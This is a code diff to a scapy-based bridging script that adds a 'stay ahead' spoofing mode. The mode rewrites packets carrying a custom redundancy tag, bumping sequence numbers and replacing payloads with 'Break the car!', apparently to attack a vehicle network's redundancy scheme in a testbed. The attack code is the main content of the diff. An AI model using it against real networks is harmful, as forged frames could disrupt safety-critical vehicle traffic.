@@ -7,6 +7,8 @@
 import time
 import sys
 
+from scapy.packet import Raw
+
 from RedundancyTag import RedundancyTag
 from scapy.sendrecv import bridge_and_sniff
 
@@ -25,20 +27,14 @@ def determine_attack():
         print("No attack number provided. Defaulting to passive mode.")
 
     if attack == 1:
-        return passive
+        """The attacker uses spoofing to create new packets within
+        the network with existing sequence numbers that arrive
+        earlier than the correct packets."""
+        print("Stay ahead spoofing is enabled.")
+        return stay_ahead
     else:
         print("Passive mode is enabled.")
         return passive
-
-
-def determine_redundancy_tag(pkt):
-    """
-    This function determines the redundancy tag of the packet.
-    """
-    if pkt.haslayer(RedundancyTag):
-        return True
-    else:
-        return False
 
 
 def passive(pkt):
@@ -46,7 +42,21 @@ def passive(pkt):
     This function is the passive mode.
     """
     pkt.show()
-    return determine_redundancy_tag(pkt)
+    return pkt.haslayer(RedundancyTag)
+
+
+def stay_ahead(pkt):
+    """
+    This function modifies packets by increasing the sequence
+    number by 1, and changing the payload.
+    """
+    if pkt.haslayer(RedundancyTag):
+        pkt[RedundancyTag].SequenceNumber += 1
+        debug_number = pkt[Raw].load.decode("utf-8").split(' ')[0]
+        pkt[Raw].load = debug_number + " Break the car!"
+        return pkt
+    else:
+        return False
 
 
 attack_method = determine_attack()
